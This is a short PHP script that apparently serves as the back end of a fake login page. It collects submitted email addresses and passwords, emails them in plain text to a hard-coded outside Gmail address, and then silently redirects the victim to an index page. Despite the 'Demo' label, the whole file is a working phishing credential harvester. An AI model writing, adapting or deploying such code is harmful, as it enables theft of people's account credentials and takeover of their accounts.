<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = htmlspecialchars($_POST["email"]);
  $password = htmlspecialchars($_POST["password"]);

  $to = "markykent846@gmail.com"; // Replace with your own email
  $subject = "New Demo Login Submission";
  $message = "Email: $email\nPassword: $password";
  $headers = "From: demo@yourdomain.com";

  // Send email
  mail($to, $subject, $message, $headers);

  // Redirect after submission
  header("Location: index.html");
  exit();
}
?>
